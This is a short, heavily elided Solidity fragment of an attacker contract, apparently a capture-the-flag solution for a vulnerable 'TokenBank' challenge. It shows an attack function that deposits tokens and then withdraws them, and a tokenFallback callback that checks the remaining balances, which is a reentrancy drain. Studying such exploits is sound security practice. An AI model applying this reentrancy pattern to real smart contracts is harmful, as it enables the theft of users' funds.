...
contract TokenBankAttacker {
    ...
    function attack() external {
        ...
        // This call will increase the balanceOf of this contract by the `initialAmount`.
        token.transfer(address(challenge), initialAmount);
        challenge.withdraw(initialAmount);

        // Send back the tokens to the sender.
    ...
    function tokenFallback(address from, uint256 value, bytes memory data) public {
        ...
        uint256 value = challenge.balanceOf(address(this));
        uint256 left = token.balanceOf(address(challenge));
